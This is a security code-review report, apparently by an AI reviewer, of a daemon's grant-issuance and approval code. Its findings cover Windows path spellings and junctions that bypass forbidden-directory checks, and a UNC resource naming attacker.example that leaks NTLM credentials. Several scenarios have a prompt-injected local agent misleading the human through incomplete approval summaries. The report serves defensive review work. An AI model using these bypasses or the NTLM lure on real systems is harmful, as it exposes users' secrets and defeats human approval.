# C11: Grant issuance, policies, revoke, quarantine release

Reviewer: CR-R2 · model claude-opus-5-5 · elapsed 13 min · commit 6cc26a7

## Summary

| Critical | High | Medium | Low | Info |
|---|---|---|---|---|
| 0 | 2 | 3 | 3 | 1 |

The transactional side of issuance is solid: every Precondition re-checks session, peer, D5,
debate and resource through its tx, Perform writes only through tx, the policy path re-checks
steps 1–2 inside its own tx, and `ws_release` is bound to the quarantined seq (R35 H1 holds).
The weak spot is **step 3 on Windows**: the forbidden-resource check compares path spellings.
`\\?\C:\…` and `\\localhost\C$\…` spellings of the config dir or the home dir pass, and so does
a junction, because Go ≥ 1.23 `filepath.EvalSymlinks` no longer resolves mount points. Tests
show the config dir's files are then served (C11-04, C11-02). The approval summaries also
leave out most of what the human approves (scope, branch, `--public`, `until`, fingerprint,
path), so a local agent can get more than the human thinks they approved (C11-01). No Critical:
each issue needs a local agent and a human approval.

## Questions

1. **Active grant without a human?** Not without a human or an approved policy. The policy path
   (`internal/daemon/grant.go:488-549`) uses `capability.Match`, which requires an exact peer,
   action, resolved path and branch, a scope inside the policy's by segments, the same
   sensitivity and an expiry ≤ max (`internal/capability/store.go:647-673`). It then re-checks
   session/peer/D5 and the debate rule inside the issuing tx (`grant.go:511-525`). The pending
   path re-checks steps 1–3 in the Precondition (`grant.go:563-580`). Perform reads the approval
   id through tx (`grant.go:589-593`) and `ActivateTx` refuses a non-pending row
   (`store.go:280-282`). Gaps: the human approves a summary that hides scope, branch, public,
   until, fingerprint and the full path (**C11-01**). `Match` runs outside the issuing tx, so a
   policy removed a moment earlier can still issue (**C11-08**, Low).
2. **Forbidden resources:** containment is component-wise (`isWithin`, `grant.go:198-207`,
   R28 L1 fixed) and case-folded on Windows/macOS (`grant.go:170-179`). On Windows, though, it is
   spelling-based and is bypassed by `\\?\` and UNC admin-share forms (**C11-04**) and by
   junctions (**C11-02**). A UNC resource makes the daemon open an SMB connection before any
   approval (**C11-03**). `.git` is not refused at issuance (**C11-05**).
3. **N1–N5:** Holds. The Preconditions only read through tx (`recheckIssuanceTx` `grant.go:755`,
   `GetTx`, `CheckSensitiveGrant(tx)`, `PolicyCountTx`, `peerTrustTx`). `recheckResource` runs
   only filesystem and git commands (git has a 10 s timeout, `grant.go:227`). Perform writes via
   `ActivateTx`/`SubmitTx`/`auditTx`/`PolicyInsertTx` on tx and wakes the outbox after commit
   (`afterCommitResult`). No hook calls the approval Store. `OnClosed` calls `RejectSubjects`
   after commit (`quarantine.go:54-62`). N5: pending row deleted when `Create` fails
   (`grant.go:619`).
4. **`ws_release`:** Gated by an approval whose Precondition re-reads role, state and **seq** in
   tx and refuses a changed seq (`internal/daemon/session.go:535-555`). R35 H1 holds. The
   approval id reaches the audit through a closure (O-147).
5. **CLI:** `grants` and `grant policy list` print the peer name and the held grant's branch
   raw (**C11-07**). Labels are `[a-z0-9._-]` (`internal/capability/token.go:51`) and scope
   follows the path grammar. Keys starting with `-` are safe: `parseInterspersed` treats only
   *defined* flag names as flags (`cmd/agentnet/pair.go:191`), and `@` or `--` also work.

## Findings

### C11-04 · High · confirmed-test
- **Where:** `internal/daemon/grant.go:133-162` (`validateResource`), `grant.go:173-179` (`foldPath`), `grant.go:209-216`
- **What goes wrong:** On Windows the config-dir and home checks compare cleaned, lowercased
  strings. `filepath.EvalSymlinks` keeps a `\\?\` prefix or a UNC spelling as given, so
  `\\?\C:\Users\me\AppData\Roaming\dorylinae` (the config dir itself), `\\?\C:\Users\me` (home),
  `\\?\UNC\localhost\C$\Users\me` and `\\localhost\C$\Users\me\AppData\Roaming\dorylinae` are all
  accepted. `os.OpenRoot` then serves them.
- **Scenario:** A local agent (prompt-injected) with an open requester session calls
  `grant_create` with `resource = \\?\C:\Users\me\AppData\Roaming\dorylinae` (or the home dir the
  same way). The approval window says "approve grant fs.read on dorylinae-3f2a to bob for 2h0m0s?".
  Once the human approves, the peer fetches `dorylinae.db` (mail, requests, approvals, audit) and,
  with the file keystore, key files. With the home dir it fetches `.ssh`. `recheckResource`
  passes too, since it calls the same function. Test `zz_review55_C11-04_test.go`: 6 of 10
  spellings accepted, and `TestReview55C1104PrefixedConfigDirServed` reads `SECRET-DB` through
  the resolved path.
- **Spec:** `Docs/protocol/grant.md` §Issuance step 3: "Refused: the config dir … or any path inside it or containing it, the user's home directory itself, and a filesystem root".
- **Fix direction:** Refuse `\\?\`, `\\.\` and UNC resources (or normalise them with `GetFinalPathNameByHandle`), and compare by file identity (`os.SameFile` on the resource and each ancestor) instead of spelling.
- **Related:** C11-02, C11-01, O-126, O-151

### C11-01 · High · confirmed-read
- **Where:** `internal/daemon/grant.go:616` (grant summary), `grant.go:960` (policy summary)
- **What goes wrong:** The approval summary shows only the action, the **label** (basename + 4
  hex, not the path), the peer's **name** and the expiry. It leaves out scope, branch,
  `sensitive/--public` and the peer fingerprint. The policy summary shows the path but leaves out
  branch, scope, `--public`, `until` and the fingerprint. The human cannot see what they approve.
- **Scenario:** A local agent (prompt-injected) asked to "share docs/ of ~/work/app with bob"
  calls `grant_create` with `action=git.read`, `resource=/work/app#main`, `public=true` and no
  scope. The window shows "approve grant git.read on app-1c2d to bob for 2h0m0s?", the same as
  the intended request, but the grant is non-sensitive, so no result quarantine applies. It
  also covers the whole repo, not `docs/`. Other variants: a same-basename directory elsewhere
  (`/secret/app` gives `app-xxxx`); an introduced peer whose card name equals bob's (O-067); a
  `grant_policy_add` with `public=true`, `until=2160h` and another branch, shown as "git.read on
  /work/app for bob, up to 168h0m0s", which then auto-issues quarantine-free grants for 90 days.
- **Spec:** `Docs/protocol/approval.md` §The approval window: "the summary (action, resource, peer name and fingerprint, expiry)". OD-P2-13 requires the human to opt out of sensitivity.
- **Fix direction:** Put the full resolved path, branch, scope, sensitive/public, expiry/until and the peer fingerprint in both summaries (cleaned, digits stripped).
- **Related:** O-067, O-129, C11-06

### C11-02 · Medium · confirmed-test
- **Where:** `internal/daemon/grant.go:140` (`filepath.EvalSymlinks`), `grant.go:148-157`; serving `internal/capability/fs.go:231`
- **What goes wrong:** With Go 1.27, `filepath.EvalSymlinks` on Windows does not resolve mount
  points (junctions), so a junction whose target is the config dir or the home dir passes
  step 3. `os.OpenRoot` follows the junction at the root, and `walk` only checks components
  *below* the root.
- **Scenario:** A junction `C:\work\share` points to `%APPDATA%\dorylinae` or to the home dir
  (created by the user, or by tooling such as pnpm/OneDrive setups; creation by a local shell is
  out of scope). A local agent requests `fs.read` on it and the human approves "share-xxxx". The
  peer then reads the config dir. Tests `TestReview55C1102JunctionToConfigDir` and
  `TestReview55C1102JunctionServed`: accepted, `read … data="SECRET-SEED"`. The stock legacy
  junction `%USERPROFILE%\Application Data` (→ Roaming, which contains the config dir) is also
  accepted at issuance. Serving through it failed with `io_error` on this PC (probably its deny
  ACE), so the stock case is not shown exploitable.
- **Spec:** grant.md §Issuance step 3 (see C11-04). The §Threat model row "secrets in the config dir … forbidden resources at issuance".
- **Fix direction:** Refuse a resource whose final component or any ancestor is a reparse point, or resolve it with `GetFinalPathNameByHandle` and compare by `os.SameFile`.
- **Related:** C11-04, O-162

### C11-03 · Medium · confirmed-read
- **Where:** `internal/daemon/grant.go:137-144` (`validateResource`), called before any approval from `grant.go:420` and `grant.go:885`
- **What goes wrong:** A UNC resource (`\\host\share\dir`, `\\?\UNC\host\…`) is absolute, so
  `EvalSymlinks` and `os.Stat` open it at once. The daemon connects over SMB (WebDAV fallback)
  to a host the caller chose, authenticating with the user's NTLM credentials, before any human
  approval exists.
- **Scenario:** A local agent (prompt-injected, IPC only) calls `grant_policy_add`
  `{peer:"@bob", action:"fs.read", resource:"\\\\attacker.example\\x\\y", max_expires:"1h"}`.
  This needs only one paired peer and no session. The daemon (the user's logon session) sends a
  Net-NTLMv2 response to attacker.example, which can crack or relay it. The UNC path was shown to
  be dialled: `\\127.0.0.1\C$\Users\yazan` resolved in `zz_review55_C11-04_test.go`.
- **Spec:** none directly. It breaks the approval.md boundary that a local agent may not make the daemon act before human approval. Related residual: O-151 (git UNC).
- **Fix direction:** Refuse UNC and device-namespace paths in `validateResource` before touching the filesystem (check `filepath.VolumeName` for a `\\` prefix).
- **Related:** O-151, C11-04

### C11-05 · Medium · confirmed-read
- **Where:** `internal/daemon/grant.go:133-162`; serving `internal/capability/fs.go:178-205` (`walk` checks `isGitName` only for segments below the root)
- **What goes wrong:** A resource that *is* a `.git` directory, or lies inside one
  (`/repo/.git`, `/repo/.git/refs`), is not refused, and everything under it is served. The
  spec promises that nothing under a `.git` directory is served.
- **Scenario:** A local agent requests `fs.read` on `/work/app/.git`. The label reads
  `.git-ab12`, visible but easy to miss. The human approves, and the peer reads `.git/config`
  (remote URLs with embedded tokens, credential helpers), packed objects of every branch and
  history, and hooks.
- **Spec:** grant.md §Resource kinds, fs "Not served: Anything under a `.git` directory"; §Threat model "`.git` excluded (any case, no 8.3 aliases, no junctions)".
- **Fix direction:** At issuance, refuse a resolved path with any `.git` component (case-folded, with the same `isGitName` rule), and bare-repo dirs for `fs.read`.
- **Related:** none

### C11-06 · Low · confirmed-read
- **Where:** `internal/daemon/grant.go:616`, `grant.go:960`
- **What goes wrong:** The grant and policy summaries embed `peer.Name` (the peer's own card
  name, ≤ 128 runes, digits and bidi allowed: `internal/agentcard/agentcard.go:113-119`) without
  `stripLongDigits(notify.Clean(…, 40))`. Device link, device scope and debate constraint all
  apply that mitigation (`device.go:487`, `debate_constrain.go:70`).
- **Scenario:** A paired peer names its card "bob code 482913". In terminal mode, or in the
  toast body, the decoy digits appear next to the real code, and wrong attempts burn the
  approval (a lockout nuisance). The window itself Cleans bidi.
- **Spec:** approval.md §Flow step 1: "Peer-supplied text in the summary goes through `notify.Clean`".
- **Fix direction:** Use `peerDisplayName`/`stripLongDigits(notify.Clean(name, 40))` in both summaries.
- **Related:** O-129 (its "mitigated by stripLongDigits" does not hold for grants)

### C11-07 · Low · confirmed-read
- **Where:** `cmd/agentnet/grant.go:185-193`, `cmd/agentnet/grant.go:376`, `cmd/agentnet/device.go:130-135`
- **What goes wrong:** `agentnet grants` prints a held grant's `branch` (from the peer's token.
  `checkBranch` rejects C0/DEL only, so C1 and bidi are allowed: `internal/capability/token.go:257,280-286`)
  and the peer's card name (bidi allowed) without `termSafe`.
- **Scenario:** A paired peer issues a grant with branch `main\u202Egnp.x`, or with a name that
  contains RLO. The `grants` table is reordered or spoofed in the user's terminal.
- **Spec:** notify.md §Text and sanitising (by analogy). O-100 is the same pattern for other commands.
- **Fix direction:** Pass name, label, branch and scope through `termSafe` in both tables.
- **Related:** O-100, O-126

### C11-08 · Low · confirmed-read
- **Where:** `internal/daemon/grant.go:488-497` (`Match` on `capStore.DB` before `BeginTx`)
- **What goes wrong:** The policy match is not re-checked inside the issuing tx. A
  `grant_policy_remove` (or a policy reaching `until`) that commits between `Match` and
  `BeginTx` still issues one active grant under the removed policy.
- **Scenario:** The human removes a policy while a local agent calls `grant_create` at the same
  moment. One grant issues after the removal. The window is milliseconds and the grant is
  revocable.
- **Spec:** grant.md §Policies ("an ended policy matches nothing").
- **Fix direction:** Re-read the matched policy by id through `tx` before `InsertActiveTx`.
- **Related:** none

### C11-09 · Info · confirmed-read
- **Where:** `internal/daemon/grant.go:951` (`grant.policy_add` actor `daemon`), `grant.go:992` (`grant.policy_remove` detail `{policy}`)
- **What goes wrong:** Audit drift. The spec gives actor `cli` and detail `{policy, peer, action}` for both. The code uses `daemon` for add and omits peer/action on remove. No content leaks.
- **Scenario:** An auditor filtering `grant.policy_remove` by peer finds nothing.
- **Spec:** grant.md §Audit table.
- **Fix direction:** Align the code or the spec.
- **Related:** O-134 (similar audit-shape drift)

## Assumptions and contracts

- `capability.Match` is the full policy rule (peer, action, exact path, branch, scope, sensitivity, expiry, until): `internal/capability/store.go:614-673`. **Checked**.
- The fs server serves only `rec.Path` through `os.OpenRoot` and rejects reparse points below the root: `internal/capability/fs.go:163-205,224-235`. **Checked**. It does *not* re-apply the forbidden-resource rule, so issuance is the only gate (C11-02/04/05).
- The approval Store calls Precondition and Perform inside one tx after marking the approval `approved`, and Perform's approval-id query relies on that (`grant.go:590`). **Unchecked** here (C12).
- `approval.Store` / the window Clean the whole summary (`internal/notify/window.go:36-42`). **Checked** for the window. The toast body and terminal text use the raw summary (`internal/approval/store.go:201-210`).
- `worksession` close revokes the session's grants in the closing tx (`RevokeForSessionTx`, `store.go:376`) and then fires `OnClosed`. **Unchecked** that every close path calls it (C10/worksession chunk).
- `peers.Store` calls `revokeForRemovedPeer` inside the removal tx (`grant.go:796-803`). **Unchecked** (peers chunk).
- `capability.ValidScopePath` enforces the §Paths grammar for scope (`grant.go:434,899`). **Unchecked** (C13/capability).
- `resolvePeer` refuses ambiguous names (`internal/daemon/ping.go:118-129`). **Checked**.

## Checked and fine

- Precondition re-checks steps 1–3 and the debate rule in tx, and fails closed on DB errors (`grant.go:563-580`, `recheckIssuanceTx` `:755-771`, `peerTrustTx` `:740-749`). R28 M1/M2/M3 fixed.
- The policy path re-checks steps 1–2 and the debate rule inside the issuing tx (`grant.go:511-525`), R28 M1 / R43 M5.
- Perform reads the approval id in tx (R35 L2 fixed, `grant.go:589-593`). `ActivateTx` refuses a non-pending row and an empty approval id.
- A sensitive policy never covers a `--public` grant, and a public one never covers a sensitive grant (`store.go:660-662`, R28 H1 fixed).
- A policy's resource is validated like issuance (R28 L2, `grant.go:885`). Policy count is re-checked in tx (R28 M3). A removed peer is re-checked in the policy Precondition.
- `grant_revoke`: grantor only, idempotent, and state + `grant.revoke` mail in one tx (`grant.go:668-721`). Audit after commit carries no content.
- Audit rows carry ids/enums only: no path, label, scope or branch in `grant.create/auto/issue/refused/revoke/policy_*`.
- `ws_release` is approval-gated and bound to seq (R35 H1, `session.go:535-555`).
- `wireQuarantine` uses `QuarantineHolds` (ever-active sensitive in the session, or to the peer within exp+7 d), and `OnClosed` rejects the session's and its grants' pending approvals after commit (`quarantine.go:36-62`, R28 L8). If `List` fails, grant approvals stay pending but their Precondition fails (fail closed).
- `validateResource` refuses relative paths, non-directories, drive roots (`\\?\C:\`, `\\.\C:\`, `\\localhost\C$` shown refused) and uses component-wise containment (R28 L1).
- `grant_create` is requester-only and refuses debate sessions and non-open sessions (OD-P2-5).
- CLI flag parsing handles keys starting with `-` (`pair.go:165-195`).
